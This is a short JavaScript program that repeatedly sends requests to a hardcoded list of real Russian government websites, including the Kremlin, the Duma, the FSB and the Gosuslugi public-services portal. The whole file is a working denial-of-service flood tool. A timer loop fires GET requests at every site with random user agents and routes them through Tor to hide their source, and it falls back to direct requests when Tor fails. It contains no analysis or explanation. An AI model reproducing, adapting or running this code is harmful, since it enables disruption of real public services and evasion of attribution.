const tor = require('tor-request');
const request = require('request');
const randomUseragent = require('random-useragent');

const urls = ["http://duma.gov.ru/", "http://president-sovet.ru/", "https://sovetnational.ru/", "https://www.gosuslugi.ru/ru/", "https://zakupki.gov.ru/epz/main/public/home.html", "https://gossluzhba.gov.ru/", "http://defence.council.gov.ru/", "http://budget.council.gov.ru/", "http://www.kremlin.ru/", "https://government.ru/", "http://www.scrf.gov.ru/", "http://www.ksrf.ru/ru/Pages/default.aspx", "http://www.vsrf.ru/", "http://premier.gov.ru/events/", "https://www.mchs.gov.ru/dokumenty/federalnye-zakony", "https://minjust.gov.ru/ru/", "http://www.fsb.ru/", "https://rosguard.gov.ru/", "https://customs.gov.ru/", "https://udprf.ru/", "http://favt.gov.ru/"]


function sendRequestWithoutProxy(url) {
    request({
        url,
        method: 'GET',
        headers: {
            'User-Agent': randomUseragent.getRandom()
        }
    }, (err, res) => {
        if (err) console.log(err);
        if (res?.statusCode) console.log(res.statusCode);
    });
}


(async () => {
    try {
        setInterval(() => {
            try {
                urls.forEach(url => {
                    tor.request({
                        url,
                        method: 'GET',
                        headers: {
                            'User-Agent': randomUseragent.getRandom()
                        }
                    }, (err, res) => {
                        if (err) {
                            console.log(err);
                            sendRequestWithoutProxy(url)
                        }
                        if (res?.statusCode) console.log(res.statusCode);
                    })
                })
            } catch(err) {
                console.log(err)
            }
        })
    } catch(err){
        console.log(err)
    }
})()


